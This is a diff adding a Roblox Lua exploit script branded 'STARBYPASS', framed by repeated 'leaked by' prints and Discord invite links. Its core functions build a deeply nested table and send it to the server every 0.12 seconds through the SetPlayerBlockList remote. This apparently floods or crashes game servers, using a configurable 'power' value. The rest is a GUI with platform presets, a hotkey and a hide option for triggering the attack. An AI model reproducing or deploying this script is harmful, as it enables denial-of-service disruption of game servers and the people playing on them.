@@ -1,0 +1,614 @@
+print("discord.gg/GPRzaWyEt")
+print("leaked by slivin and eugeneًں¥·")
+print("leaked by slivin and eugeneًں¥·")
+print("leaked by slivin and eugeneًں¥·")
+print("leaked by slivin and eugeneًں¥·")
+print("leaked by slivin and eugeneًں¥·")
+print("leaked by slivin and eugeneًں¥·")
+print("leaked by slivin and eugeneًں¥·")
+print("leaked by slivin and eugeneًں¥·")
+print("leaked by slivin and eugeneًں¥·")
+print("leaked by slivin and eugeneًں¥·")
+
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
+local DEPTH      = 296
+local SPAM_DELAY = 0.12
+local running    = false
+local bomb       = nil
+local spamThread = nil
+local function buildBomb(power)
+	local maintable   = {}
+	local spammedtable = {}
+	table.insert(spammedtable, {})
+	local z = spammedtable[1]
+	for i = 1, DEPTH do
+		local tableins = {}
+		table.insert(z, tableins)
+		z = tableins
+	end
+	local maxRep = math.floor(power / (DEPTH + 2))
+	for i = 1, maxRep do
+		table.insert(maintable, spammedtable)
+	end
+	return maintable
+end
+local function stopBypass()
+	running = false
+	if spamThread then task.cancel(spamThread) end
+	bomb       = nil
+	spamThread = nil
+end
+local function startBypass(power)
+	stopBypass()
+	running = true
+	bomb = buildBomb(power)
+	spamThread = task.spawn(function()
+		while running do
+			if bomb then
+				pcall(function()
+					game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
+				end)
+			end
+			task.wait(SPAM_DELAY)
+		end
+	end)
+end
+local function getGuiParent()
+	if typeof(gethui) == "function" then
+		local ok, result = pcall(gethui)
+		if ok and result then return result end
+	end
+	local ok, coreGui = pcall(function() return game:GetService("CoreGui") end)
+	if ok and coreGui then return coreGui end
+	return LocalPlayer:WaitForChild("PlayerGui")
+end
+local function new(className, props, parent)
+	local obj = Instance.new(className)
+	for k, v in pairs(props or {}) do obj[k] = v end
+	obj.Parent = parent
+	return obj
+end
+local function corner(obj, radius)
+	return new("UICorner", {CornerRadius = UDim.new(0, radius)}, obj)
+end
+local function stroke(obj, color, thickness, transparency)
+	return new("UIStroke", {
+		Color            = color,
+		Thickness        = thickness or 1,
+		Transparency     = transparency or 0,
+		ApplyStrokeMode  = Enum.ApplyStrokeMode.Border,
+	}, obj)
+end
+local parent = getGuiParent()
+local old = parent:FindFirstChild("VampireBypassGui")
+if old then old:Destroy() end
+local gui = new("ScreenGui", {
+	Name            = "VampireBypassGui",
+	ResetOnSpawn    = false,
+	IgnoreGuiInset  = true,
+	ZIndexBehavior  = Enum.ZIndexBehavior.Sibling,
+}, nil)
+if type(syn) == "table" and type(syn.protect_gui) == "function" then
+	pcall(syn.protect_gui, gui)
+elseif typeof(protectgui) == "function" then
+	pcall(protectgui, gui)
+end
+pcall(function() gui.Parent = parent end)
+if not gui.Parent then gui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
+local main = new("Frame", {
+	Name              = "MainFrame",
+	Size              = UDim2.fromOffset(230, 308),
+	Position          = UDim2.new(0.5, -115, 0.5, -154),
+	BackgroundColor3  = Color3.fromRGB(0, 0, 0),
+	BorderSizePixel   = 0,
+	ClipsDescendants  = true,
+	Active            = true,
+}, gui)
+corner(main, 13)
+stroke(main, Color3.fromRGB(39, 39, 39), 1.3)
+new("UIScale", {Scale = 1}, main)
+local photoHolder = new("Frame", {
+	Size              = UDim2.new(1, -6, 1, -37),
+	Position          = UDim2.fromOffset(3, 34),
+	BackgroundColor3  = Color3.fromRGB(0, 0, 0),
+	BackgroundTransparency = 1,
+	BorderSizePixel   = 0,
+	ClipsDescendants  = true,
+	ZIndex            = 1,
+}, main)
+corner(photoHolder, 10)
+new("ImageLabel", {
+	Size              = UDim2.fromScale(1, 1),
+	BackgroundTransparency = 1,
+	Image             = "rbxassetid://98596557474777",
+	ScaleType         = Enum.ScaleType.Crop,
+	ImageTransparency = 0.22,
+	ZIndex            = 1,
+}, photoHolder)
+new("Frame", {
+	Size              = UDim2.fromScale(1, 1),
+	BackgroundColor3  = Color3.fromRGB(2, 2, 2),
+	BackgroundTransparency = 0.74,
+	BorderSizePixel   = 0,
+	ZIndex            = 2,
+}, photoHolder)
+local header = new("Frame", {
+	Size              = UDim2.new(1, -6, 0, 31),
+	Position          = UDim2.fromOffset(3, 3),
+	BackgroundColor3  = Color3.fromRGB(4, 4, 4),
+	BorderSizePixel   = 0,
+	ClipsDescendants  = true,
+	ZIndex            = 4,
+}, main)
+corner(header, 10)
+new("Frame", {
+	Size              = UDim2.new(1, 0, 0, 1),
+	Position          = UDim2.new(0, 0, 1, -1),
+	BackgroundColor3  = Color3.fromRGB(34, 34, 34),
+	BorderSizePixel   = 0,
+	ZIndex            = 5,
+}, header)
+new("TextLabel", {
+	Size              = UDim2.new(1, -70, 1, 0),
+	Position          = UDim2.fromOffset(12, 0),
+	BackgroundTransparency = 1,
+	Text              = "STARBYPASS",
+	TextColor3        = Color3.fromRGB(255, 255, 255),
+	Font              = Enum.Font.GothamBold,
+	TextSize          = 12,
+	TextXAlignment    = Enum.TextXAlignment.Left,
+	ZIndex            = 6,
+}, header)
+local hideButton = new("TextButton", {
+	Size              = UDim2.fromOffset(52, 22),
+	Position          = UDim2.new(1, -58, 0.5, -11),
+	BackgroundColor3  = Color3.fromRGB(8, 8, 8),
+	AutoButtonColor   = false,
+	BorderSizePixel   = 0,
+	Text              = "Hide",
+	TextColor3        = Color3.fromRGB(110, 110, 110),
+	Font              = Enum.Font.GothamBold,
+	TextSize          = 10,
+	ZIndex            = 7,
+}, header)
+corner(hideButton, 7)
+stroke(hideButton, Color3.fromRGB(48, 48, 48), 1)
+local selector = new("Frame", {
+	Size              = UDim2.new(1, -18, 0, 22),
+	Position          = UDim2.fromOffset(9, 42),
+	BackgroundColor3  = Color3.fromRGB(4, 4, 4),
+	BorderSizePixel   = 0,
+	ZIndex            = 4,
+}, main)
+corner(selector, 7)
+stroke(selector, Color3.fromRGB(67, 67, 67), 1)
+local selectorFill = new("Frame", {
+	Size              = UDim2.new(0.5, -3, 1, -4),
+	Position          = UDim2.fromOffset(2, 2),
+	BackgroundColor3  = Color3.fromRGB(255, 38, 38),
+	BorderSizePixel   = 0,
+	ZIndex            = 5,
+}, selector)
+corner(selectorFill, 5)
+local pcButton = new("TextButton", {
+	Size              = UDim2.new(0.5, 0, 1, 0),
+	BackgroundTransparency = 1,
+	BorderSizePixel   = 0,
+	Text              = "PC",
+	TextColor3        = Color3.fromRGB(255, 255, 255),
+	Font              = Enum.Font.GothamSemibold,
+	TextSize          = 10,
+	ZIndex            = 6,
+}, selector)
+local mobileButton = new("TextButton", {
+	Size              = UDim2.new(0.5, 0, 1, 0),
+	Position          = UDim2.new(0.5, 0, 0, 0),
+	BackgroundTransparency = 1,
+	BorderSizePixel   = 0,
+	Text              = "MOBILE",
+	TextColor3        = Color3.fromRGB(255, 255, 255),
+	Font              = Enum.Font.GothamSemibold,
+	TextSize          = 10,
+	ZIndex            = 6,
+}, selector)
+local ringFrame = new("Frame", {
+	Size              = UDim2.fromOffset(128, 126),
+	AnchorPoint       = Vector2.new(0.5, 0),
+	Position          = UDim2.new(0.5, 0, 0, 67),
+	BackgroundTransparency = 1,
+	ZIndex            = 3,
+}, main)
+corner(ringFrame, 13)
+local ringStroke = stroke(ringFrame, Color3.fromRGB(220, 24, 24), 3.8)
+ringStroke.LineJoinMode = Enum.LineJoinMode.Round
+local ringGradient = new("UIGradient", {
+	Rotation = 0,
+	Color = ColorSequence.new({
+		ColorSequenceKeypoint.new(0.00, Color3.fromRGB(55,  7,  7)),
+		ColorSequenceKeypoint.new(0.38, Color3.fromRGB(96,  10, 10)),
+		ColorSequenceKeypoint.new(0.50, Color3.fromRGB(235, 32, 32)),
+		ColorSequenceKeypoint.new(0.62, Color3.fromRGB(96,  10, 10)),
+		ColorSequenceKeypoint.new(1.00, Color3.fromRGB(55,  7,  7)),
+	})
+}, ringStroke)
+local ringInner = new("Frame", {
+	Size              = UDim2.new(1, -5, 1, -5),
+	Position          = UDim2.new(0, 2.5, 0, 2.5),
+	BackgroundColor3  = Color3.fromRGB(1, 1, 1),
+	BorderSizePixel   = 0,
+	ZIndex            = 4,
+}, ringFrame)
+corner(ringInner, 12)
+local statusLabel = new("TextLabel", {
+	Size              = UDim2.new(1, 0, 0, 12),
+	Position          = UDim2.fromOffset(0, 9),
+	BackgroundTransparency = 1,
+	Text              = "OFFLINE",
+	TextColor3        = Color3.fromRGB(126, 126, 126),
+	Font              = Enum.Font.GothamBold,
+	TextSize          = 9,
+	ZIndex            = 5,
+}, ringInner)
+local powerText = new("TextLabel", {
+	Size              = UDim2.new(1, 0, 0, 36),
+	Position          = UDim2.fromOffset(0, 24),
+	BackgroundTransparency = 1,
+	Text              = "97K",
+	TextColor3        = Color3.fromRGB(255, 255, 255),
+	Font              = Enum.Font.GothamBlack,
+	TextSize          = 31,
+	ZIndex            = 5,
+}, ringInner)
+local timerText = new("TextLabel", {
+	Size              = UDim2.new(1, 0, 0, 12),
+	Position          = UDim2.fromOffset(0, 61),
+	BackgroundTransparency = 1,
+	Text              = "00:00",
+	TextColor3        = Color3.fromRGB(106, 106, 106),
+	Font              = Enum.Font.Gotham,
+	TextSize          = 10,
+	ZIndex            = 5,
+}, ringInner)
+local powerBox = new("TextBox", {
+	Size              = UDim2.new(1, -14, 0, 22),
+	AnchorPoint       = Vector2.new(0.5, 1),
+	Position          = UDim2.new(0.5, 0, 1, -6),
+	BackgroundColor3  = Color3.fromRGB(7, 7, 7),
+	BorderSizePixel   = 0,
+	ClearTextOnFocus  = false,
+	Text              = "97000",
+	TextColor3        = Color3.fromRGB(205, 205, 205),
+	Font              = Enum.Font.GothamBold,
+	TextSize          = 11,
+	ZIndex            = 6,
+}, ringInner)
+corner(powerBox, 6)
+local keyRow = new("Frame", {
+	Size              = UDim2.new(1, -18, 0, 28),
+	Position          = UDim2.fromOffset(9, 197),
+	BackgroundColor3  = Color3.fromRGB(14, 14, 14),
+	BorderSizePixel   = 0,
+	ZIndex            = 4,
+}, main)
+corner(keyRow, 7)
+stroke(keyRow, Color3.fromRGB(44, 44, 44), 1)
+new("TextLabel", {
+	Size              = UDim2.fromOffset(24, 28),
+	Position          = UDim2.fromOffset(10, 0),
+	BackgroundTransparency = 1,
+	Text              = "KB:",
+	TextColor3        = Color3.fromRGB(125, 125, 125),
+	Font              = Enum.Font.GothamBold,
+	TextSize          = 8,
+	TextXAlignment    = Enum.TextXAlignment.Left,
+	ZIndex            = 5,
+}, keyRow)
+local kbButton = new("TextButton", {
+	Size              = UDim2.fromOffset(45, 22),
+	Position          = UDim2.fromOffset(35, 3),
+	BackgroundColor3  = Color3.fromRGB(26, 26, 26),
+	BorderSizePixel   = 0,
+	Text              = "V",
+	TextColor3        = Color3.fromRGB(248, 248, 248),
+	Font              = Enum.Font.GothamBold,
+	TextSize          = 10,
+	ZIndex            = 6,
+}, keyRow)
+corner(kbButton, 5)
+stroke(kbButton, Color3.fromRGB(52, 52, 52), 1)
+new("Frame", {
+	Size              = UDim2.fromOffset(1, 17),
+	Position          = UDim2.new(0.5, 0, 0.5, -8),
+	BackgroundColor3  = Color3.fromRGB(70, 70, 70),
+	BorderSizePixel   = 0,
+	ZIndex            = 5,
+}, keyRow)
+new("TextLabel", {
+	Size              = UDim2.fromOffset(36, 28),
+	Position          = UDim2.new(0.5, 8, 0, 0),
+	BackgroundTransparency = 1,
+	Text              = "CTRL:",
+	TextColor3        = Color3.fromRGB(125, 125, 125),
+	Font              = Enum.Font.GothamBold,
+	TextSize          = 8,
+	TextXAlignment    = Enum.TextXAlignment.Left,
+	ZIndex            = 5,
+}, keyRow)
+local ctrlButton = new("TextButton", {
+	Size              = UDim2.fromOffset(45, 22),
+	Position          = UDim2.new(1, -51, 0, 3),
+	BackgroundColor3  = Color3.fromRGB(26, 26, 26),
+	BorderSizePixel   = 0,
+	Text              = "None",
+	TextColor3        = Color3.fromRGB(168, 168, 168),
+	Font              = Enum.Font.GothamBold,
+	TextSize          = 8,
+	ZIndex            = 6,
+}, keyRow)
+corner(ctrlButton, 5)
+stroke(ctrlButton, Color3.fromRGB(52, 52, 52), 1)
+local activateButton = new("TextButton", {
+	Size              = UDim2.new(1, -18, 0, 40),
+	Position          = UDim2.fromOffset(9, 234),
+	BackgroundColor3  = Color3.fromRGB(16, 16, 16),
+	BorderSizePixel   = 0,
+	AutoButtonColor   = false,
+	Text              = "ACTIVATE",
+	TextColor3        = Color3.fromRGB(226, 52, 52),
+	Font              = Enum.Font.GothamBold,
+	TextSize          = 11,
+	ZIndex            = 5,
+}, main)
+corner(activateButton, 10)
+stroke(activateButton, Color3.fromRGB(28, 28, 28), 0)
+local hiddenFrame = new("Frame", {
+	Size              = UDim2.fromOffset(230, 92),
+	Position          = main.Position,
+	BackgroundColor3  = Color3.fromRGB(0, 0, 0),
+	BorderSizePixel   = 0,
+	ClipsDescendants  = true,
+	Active            = true,
+	Visible           = false,
+	ZIndex            = 40,
+}, gui)
+corner(hiddenFrame, 13)
+stroke(hiddenFrame, Color3.fromRGB(39, 39, 39), 1.3)
+local hiddenPhotoHolder = new("Frame", {
+	Size              = UDim2.new(1, -6, 1, -6),
+	Position          = UDim2.fromOffset(3, 3),
+	BackgroundTransparency = 1,
+	BorderSizePixel   = 0,
+	ClipsDescendants  = true,
+	ZIndex            = 40,
+}, hiddenFrame)
+corner(hiddenPhotoHolder, 10)
+new("ImageLabel", {
+	Size              = UDim2.fromScale(1, 1),
+	BackgroundTransparency = 1,
+	Image             = "rbxassetid://98596557474777",
+	ScaleType         = Enum.ScaleType.Crop,
+	ImageTransparency = 0.22,
+	ZIndex            = 40,
+}, hiddenPhotoHolder)
+new("Frame", {
+	Size              = UDim2.fromScale(1, 1),
+	BackgroundColor3  = Color3.fromRGB(2, 2, 2),
+	BackgroundTransparency = 0.74,
+	BorderSizePixel   = 0,
+	ZIndex            = 41,
+}, hiddenPhotoHolder)
+local hiddenHeader = new("Frame", {
+	Size              = UDim2.new(1, 0, 0, 31),
+	BackgroundColor3  = Color3.fromRGB(4, 4, 4),
+	BorderSizePixel   = 0,
+	ZIndex            = 42,
+}, hiddenPhotoHolder)
+new("Frame", {
+	Size              = UDim2.new(1, 0, 0, 1),
+	Position          = UDim2.new(0, 0, 1, -1),
+	BackgroundColor3  = Color3.fromRGB(34, 34, 34),
+	BorderSizePixel   = 0,
+	ZIndex            = 43,
+}, hiddenHeader)
+new("TextLabel", {
+	Size              = UDim2.new(1, -76, 1, 0),
+	Position          = UDim2.fromOffset(12, 0),
+	BackgroundTransparency = 1,
+	Text              = "STARBYPASS",
+	TextColor3        = Color3.fromRGB(255, 255, 255),
+	Font              = Enum.Font.GothamBold,
+	TextSize          = 11,
+	TextXAlignment    = Enum.TextXAlignment.Left,
+	ZIndex            = 43,
+}, hiddenHeader)
+local unhideButton = new("TextButton", {
+	Size              = UDim2.fromOffset(52, 22),
+	Position          = UDim2.new(1, -58, 0.5, -11),
+	BackgroundColor3  = Color3.fromRGB(8, 8, 8),
+	BorderSizePixel   = 0,
+	AutoButtonColor   = false,
+	Text              = "Unhide",
+	TextColor3        = Color3.fromRGB(110, 110, 110),
+	Font              = Enum.Font.GothamBold,
+	TextSize          = 9,
+	ZIndex            = 43,
+}, hiddenHeader)
+corner(unhideButton, 7)
+stroke(unhideButton, Color3.fromRGB(48, 48, 48), 1)
+local hiddenActivateButton = new("TextButton", {
+	Size              = UDim2.new(1, -18, 0, 39),
+	Position          = UDim2.fromOffset(9, 43),
+	BackgroundColor3  = Color3.fromRGB(16, 16, 16),
+	BorderSizePixel   = 0,
+	AutoButtonColor   = false,
+	Text              = "ACTIVATE",
+	TextColor3        = Color3.fromRGB(226, 52, 52),
+	Font              = Enum.Font.GothamBold,
+	TextSize          = 11,
+	ZIndex            = 42,
+}, hiddenPhotoHolder)
+corner(hiddenActivateButton, 10)
+local active           = false
+local startedAt        = 0
+local boundKey         = Enum.KeyCode.V
+local waitingForKey    = false
+local selectedPlatform = "PC"
+local defaultPowers = { PC = 97000, MOBILE = 72000 }
+local function formatPower(num)
+	if num >= 1000 then
+		return string.format("%dK", math.floor(num / 1000 + 0.5))
+	end
+	return tostring(num)
+end
+local function getCurrentPower()
+	local n = tonumber(powerBox.Text)
+	if not n then n = defaultPowers[selectedPlatform] end
+	return math.clamp(math.floor(n + 0.5), 1, 999999)
+end
+local function syncButtons()
+	local label = active and "DEACTIVATE" or "ACTIVATE"
+	activateButton.Text        = label
+	hiddenActivateButton.Text  = label
+end
+local function setActive(state)
+	active = state
+	if state then
+		startedAt = os.clock()
+		statusLabel.Text      = "ONLINE"
+		statusLabel.TextColor3 = Color3.fromRGB(227, 45, 45)
+		activateButton.BackgroundColor3       = Color3.fromRGB(228, 34, 34)
+		activateButton.TextColor3             = Color3.fromRGB(255, 255, 255)
+		hiddenActivateButton.BackgroundColor3 = Color3.fromRGB(228, 34, 34)
+		hiddenActivateButton.TextColor3       = Color3.fromRGB(255, 255, 255)
+		startBypass(getCurrentPower())
+	else
+		statusLabel.Text       = "OFFLINE"
+		statusLabel.TextColor3 = Color3.fromRGB(126, 126, 126)
+		activateButton.BackgroundColor3       = Color3.fromRGB(16, 16, 16)
+		activateButton.TextColor3             = Color3.fromRGB(226, 52, 52)
+		hiddenActivateButton.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
+		hiddenActivateButton.TextColor3       = Color3.fromRGB(226, 52, 52)
+		timerText.Text = "00:00"
+		stopBypass()
+	end
+	syncButtons()
+end
+local function setPlatform(platform)
+	selectedPlatform = platform
+	local isMobile = platform == "MOBILE"
+	TweenService:Create(selectorFill, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+		Position = isMobile and UDim2.new(0.5, 1, 0, 2) or UDim2.fromOffset(2, 2)
+	}):Play()
+	local p = defaultPowers[platform]
+	powerBox.Text  = tostring(p)
+	powerText.Text = formatPower(p)
+	if active then startBypass(p) end
+end
+pcButton.Activated:Connect(function()    setPlatform("PC")     end)
+mobileButton.Activated:Connect(function() setPlatform("MOBILE") end)
+powerBox.FocusLost:Connect(function()
+	local n = tonumber(powerBox.Text)
+	if not n then n = defaultPowers[selectedPlatform] end
+	n = math.clamp(math.floor(n + 0.5), 1, 999999)
+	powerBox.Text  = tostring(n)
+	powerText.Text = formatPower(n)
+	if active then startBypass(n) end
+end)
+kbButton.Activated:Connect(function()
+	waitingForKey    = true
+	kbButton.Text    = "..."
+end)
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+	if waitingForKey and input.UserInputType == Enum.UserInputType.Keyboard then
+		boundKey       = input.KeyCode
+		kbButton.Text  = input.KeyCode.Name
+		waitingForKey  = false
+		return
+	end
+	if not gameProcessed and input.UserInputType == Enum.UserInputType.Keyboard
+	and input.KeyCode == boundKey then
+		setActive(not active)
+	end
+end)
+activateButton.Activated:Connect(function()       setActive(not active) end)
+hiddenActivateButton.Activated:Connect(function() setActive(not active) end)
+hideButton.Activated:Connect(function()
+	hiddenFrame.Position = main.Position
+	main.Visible         = false
+	hiddenFrame.Visible  = true
+end)
+unhideButton.Activated:Connect(function()
+	main.Position        = hiddenFrame.Position
+	hiddenFrame.Visible  = false
+	main.Visible         = true
+end)
+activateButton.MouseEnter:Connect(function()
+	local target = active and Color3.fromRGB(236, 44, 44) or Color3.fromRGB(32, 32, 32)
+	TweenService:Create(activateButton, TweenInfo.new(0.12), {BackgroundColor3 = target}):Play()
+end)
+activateButton.MouseLeave:Connect(function()
+	local target = active and Color3.fromRGB(228, 34, 34) or Color3.fromRGB(28, 28, 28)
+	TweenService:Create(activateButton, TweenInfo.new(0.12), {BackgroundColor3 = target}):Play()
+end)
+local dragging, dragStart, startPos, dragTarget = false, nil, nil, nil
+local function beginDrag(input, target)
+	if input.UserInputType == Enum.UserInputType.MouseButton1
+	or input.UserInputType == Enum.UserInputType.Touch then
+		dragging   = true
+		dragStart  = input.Position
+		dragTarget = target
+		startPos   = target.Position
+	end
+end
+main.InputBegan:Connect(function(input)        beginDrag(input, main) end)
+hiddenFrame.InputBegan:Connect(function(input) beginDrag(input, hiddenFrame) end)
+UserInputService.InputChanged:Connect(function(input)
+	if dragging and dragTarget and (input.UserInputType == Enum.UserInputType.MouseMovement
+	or input.UserInputType == Enum.UserInputType.Touch) then
+		local delta  = input.Position - dragStart
+		local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		dragTarget.Position = newPos
+		if dragTarget == main then
+			hiddenFrame.Position = newPos
+		else
+			main.Position = newPos
+		end
+	end
+end)
+UserInputService.InputEnded:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1
+	or input.UserInputType == Enum.UserInputType.Touch then
+		dragging   = false
+		dragTarget = nil
+	end
+end)
+RunService.RenderStepped:Connect(function(dt)
+	ringGradient.Rotation = (ringGradient.Rotation + dt * 95) % 360
+	if active then
+		local elapsed  = math.floor(os.clock() - startedAt)
+		timerText.Text = string.format("%02d:%02d", math.floor(elapsed / 60), elapsed % 60)
+	end
+end)
+setPlatform("PC")
+setActive(false)
+syncButtons()
+print("STARB ypass loaded")
+
+
+print("discord.gg/aceduels")
+print("leaked by slivin and eugeneًں¥·")
+print("leaked by slivin and eugeneًں¥·")
+print("leaked by slivin and eugeneًں¥·")
+print("leaked by slivin and eugeneًں¥·")
+print("leaked by slivin and eugeneًں¥·")
+print("leaked by slivin and eugeneًں¥·")
+print("leaked by slivin and eugeneًں¥·")
+print("leaked by slivin and eugeneًں¥·")
+print("leaked by slivin and eugeneًں¥·")
+print("leaked by slivin and eugeneًں¥·")
